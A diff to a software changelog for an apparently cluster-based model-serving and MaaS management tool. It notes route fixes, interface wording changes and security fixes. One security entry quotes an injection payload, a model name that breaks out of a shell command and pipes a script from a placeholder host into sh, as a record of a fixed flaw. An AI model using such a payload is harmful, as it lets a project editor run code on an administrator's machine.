@@ -198,9 +198,38 @@ only accepts a tag whose version is the top dated section. See
   asked for Unpublish on the MaaS tab. When that unpublish stops, the model
   is not deleted. A model published on the MaaS tab still has to be
   unpublished there first.
+- A model with no route of its own goes back to none when it is
+  unpublished, in every case: a setup **Through MaaS only** whose publish
+  stopped before it recorded anything (its Unpublish put it on KServe's
+  default gateway, Delete refused it, and **Set up** again did not publish
+  it), and a model set up **Only inside the cluster** and then published
+  on the MaaS tab (Publish wrote only the gateway, so KServe made no route
+  and the model stayed partly published). Publish now gives such a model
+  its route on the MaaS gateway and records that it had none; Unpublish
+  again after a route removal that stopped waiting says the model has no
+  route. Models' Delete and Set up keep the log lines of the unpublish or
+  publish they run.
+- A model's image pull through a mirror where one source answers
+  "manifest unknown" and another refuses the node's credentials is still
+  waited on, but once the wait ends the setup and the Models tab offer
+  **Use the newest released Red Hat image** again, worded as a
+  possibility ("may not be published").
 
 ### Changed
 
+- Final review of the Environment page's wording (before release): a
+  model published on the MaaS tab reads **Through MaaS while published**
+  and shows its **MaaS address**; a model that cannot be called says so
+  once (the alert keeps the message and **Check again**); the MaaS words
+  are the dashboard's (**authorization policy**, **MaaS governance**,
+  the subscription's display name) and one name per shared part
+  (**Connectivity Link instance (Kuadrant)**, **MaaS gateway**,
+  **Database**); **Clean up MaaS** as on every other tab; a shared part
+  with a warning needs attention, and a part waiting for another is a
+  grey **Waiting**; MaaS dialogs name the model by its display name, and
+  messages no longer quote project names; the capacity warning uses GiB;
+  the Overview's in-app step reads **Show issue in &lt;project&gt;**;
+  `/environment` opens the Environment page.
 - Links to the RHOAI dashboard open the matching section page, not a
   project's details page: a project's models open its Deployments page
   (`/ai-hub/models/deployments/internal/<project>`), and MaaS opens MaaS
@@ -227,6 +256,16 @@ only accepts a tag whose version is the top dated section. See
 
 ### Security
 
+- **Models' copy-paste commands could run what a project editor wrote.**
+  The name a model serves (`spec.model.name`), which anyone who can edit
+  its project sets on any model of a catalog name, went unquoted into the
+  Use it commands' request bodies, so a name such as
+  `x"}'; curl https://evil/p|sh; echo '` ran when a cluster-admin pasted
+  them. The commands now build every body as JSON and single-quote it
+  (names elsewhere are quoted unless plain), and the backend shows, puts
+  in commands and calls a model with a served name only when it is
+  letters, digits and `. _ / : -`; otherwise Use it shows no commands and
+  says why.
 - CI, GitLab: kaniko no longer gets the Quay push credentials
   (`QUAY_USER`/`QUAY_TOKEN`). `build-main` built only a tarball but was
   logged in, and the build's `RUN` steps (`npm ci` install scripts,
